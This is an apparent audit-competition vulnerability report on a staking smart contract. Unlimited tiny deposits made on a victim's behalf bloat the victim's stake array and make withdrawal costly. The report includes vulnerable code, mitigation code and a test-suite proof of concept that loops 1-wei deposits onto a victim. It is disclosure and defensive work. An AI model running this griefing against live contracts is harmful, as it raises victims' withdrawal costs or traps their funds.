# 57358 sc medium unlimited stake entries allow account griefing via tiny deposits

**Submitted on Oct 25th 2025 at 13:47:59 UTC by @TECHFUND\_inc for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57358
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/periphery/Staking.sol>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  * Permanent freezing of funds

## Description

### Brief / Intro

The staking contract allows unlimited stake entries per user with no minimum deposit amount, enabling attackers to grief victim accounts by depositing tiny amounts on their behalf. This bloats the victim's `stake` array, making withdrawals impossible or extremely expensive due to gas limits when processing the oversized array.

### Vulnerability Details

The staking contract implements the ERC4626 standard which allows deposits on behalf of other users, but lacks:

* Minimum deposit amount requirement
* Maximum stake entry limit per user

When an attacker deposits tiny amounts repeatedly on a victim's behalf, it creates thousands of stake entries. During withdrawal, the contract must iterate through all entries, potentially exceeding block gas limits or making withdrawal prohibitively expensive.

Relevant code snippets:

```solidity
//  @audit  - No protection against tiny deposits in deposit function and who can deposit on behalf of user
function _deposit(
    address by,
    address to,
    uint256 assets,
    uint256 shares
) internal override {
    super._deposit(by, to, assets, shares);
    // lock freshly minted shares
    stakes[to].push(Stake({shares: shares, timestamp: block.timestamp}));
}
```

```solidity
//  @audit - Vulnerable stake consumption logic - must iterate through ALL stake 
function _consumeUnlockedSharesOrRevert(
    address staker,
    uint256 need
) internal {
    Stake[] storage userStakes = stakes[staker];
    uint256 _min = minStakePeriod;
    uint256 nowTs = block.timestamp;
    uint256 remaining = need;
    for (uint256 i; i < userStakes.length && remaining > 0; ) {
        // @audit - Processing logic that must iterate through ALL entries of user
        // ...
    }
}
```

## Impact Details

* Victim funds may become effectively trapped or extremely expensive to withdraw as the victim must pay very high gas to iterate and consume many tiny stake entries.
* Easy to execute: attack requires only many small repeated deposits, potentially done by many addresses.
* Depending on chain block gas limits and implementation details, some victims may be unable to withdraw funds permanently due to gas limit errors.

## References / Suggested Mitigations

Here are sample implementations which can mitigate this vulnerability. Consider implementing one or more of these solutions.

Option 1: Add minimum deposit amount

```solidity
uint256 public constant MIN_DEPOSIT_AMOUNT = 1e15; // 0.001 tokens

function _deposit(
    address by,
    address to,
    uint256 assets,
    uint256 shares
) internal override {
    require(assets >= MIN_DEPOSIT_AMOUNT, "MIN_DEPOSIT");
    super._deposit(by, to, assets, shares);
    // lock freshly minted shares
    stakes[to].push(Stake({shares: shares, timestamp: block.timestamp}));
}
```

Option 2: Limit stake entries per user

```solidity
uint256 public constant MAX_STAKE_ENTRIES = 20;

function _deposit(
    address by,
    address to,
    uint256 assets,
    uint256 shares
) internal override {
    require(stakes[to].length < MAX_STAKE_ENTRIES, "TOO_MANY_STAKES");
    super._deposit(by, to, assets, shares);
    // lock freshly minted shares
    stakes[to].push(Stake({shares: shares, timestamp: block.timestamp}));
}
```

(Implementors may also consider hybrid approaches: minimum deposit + limited entries + aggregation of tiny deposits into an existing stake entry, or allow users to prune/compact stakes with a gasless relayer/tiny-batch helper.)

## Proof of Concept

Add the following test functions within the `describe("Staking features")` block inside the `staking.test.ts` test file. These tests demonstrate gas usage difference between a regular withdrawal and a withdrawal after an attacker has griefed a victim by creating many tiny stake entries.

```typescript
it.only('withdraw() regular scenario', async () => {
  const { staking, long, admin, user1 } = await loadFixture(fixture);
  const victimDeposit = ethers.utils.parseEther('1000');

  await long.connect(admin).transfer(user1.address, victimDeposit);
  await long.connect(user1).approve(staking.address, victimDeposit);
  await staking.connect(user1).deposit(victimDeposit, user1.address);

  await staking.connect(admin).setMinStakePeriod(1);

  const tx = await staking.connect(user1).withdraw(victimDeposit, user1.address, user1.address);
  const receipt = await tx.wait();
  console.log('withdraw under regular scenario - gasUsed:', receipt.gasUsed.toString());
  console.log(
    'withdraw under attack - cost (ETH):',
    ethers.utils.formatEther(receipt.effectiveGasPrice.mul(receipt.gasUsed)),
  );
});
```

```typescript
it.only('withdraw() grief attack', async () => {
  const { staking, long, admin, user1, user2 } = await loadFixture(fixture);
  const victimDeposit = ethers.utils.parseEther('1000');
  const attacker = user2;
  const attackerDeposit = 1; /// 1 wei
  // @audit - giving 100 so poc can run quickly but in real attack it can be repeated more number of times
  await long.connect(admin).transfer(attacker.address, attackerDeposit * 100);
  await long.connect(attacker).approve(staking.address, attackerDeposit * 100);
  // @audit - attacker griefing victim `stakes` array with 1 wei deposits so gas cost will be increased exponentially when victim tries to withdraw which access `stakes` state variable

  for (let i = 0; i < 50; i++) {
    await staking.connect(attacker).deposit(attackerDeposit, user1.address);
  }
  await long.connect(admin).transfer(user1.address, victimDeposit);
  await long.connect(user1).approve(staking.address, victimDeposit);
  await staking.connect(user1).deposit(victimDeposit, user1.address);

  for (let i = 0; i < 50; i++) {
    await staking.connect(attacker).deposit(attackerDeposit, user1.address);
  }

  await staking.connect(admin).setMinStakePeriod(1);

  const tx = await staking.connect(user1).withdraw(victimDeposit, user1.address, user1.address);
  const receipt = await tx.wait();
  console.log('withdraw under attack - gasUsed:', receipt.gasUsed.toString());
  console.log(
    'withdraw under attack - cost (ETH):',
    ethers.utils.formatEther(receipt.effectiveGasPrice.mul(receipt.gasUsed)),
  );
});
```

<details>

<summary>Test logs (example output)</summary>

```
Logs:
withdraw under regular scenario - gasUsed: 89932
withdraw under attack - cost (ETH): 0.000089932
      ✔ withdraw() regular scenario (1211ms)
withdraw under attack - gasUsed: 581288
withdraw under attack - cost (ETH): 0.000581288
      ✔ withdraw() grief attack (634ms)

  2 passing (2s)

Done in 3.53s.
```

</details>
